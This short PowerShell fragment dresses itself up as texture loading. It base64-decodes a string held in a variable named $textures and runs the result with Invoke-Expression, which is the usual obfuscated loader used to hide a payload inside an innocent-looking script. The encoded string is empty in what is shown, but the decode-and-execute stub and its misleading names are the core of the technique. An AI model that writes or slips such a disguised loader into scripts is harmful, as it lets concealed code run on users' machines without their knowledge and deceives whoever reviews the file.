$textures = ""; $loadTextures = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($textures))
Invoke-Expression $loadTextures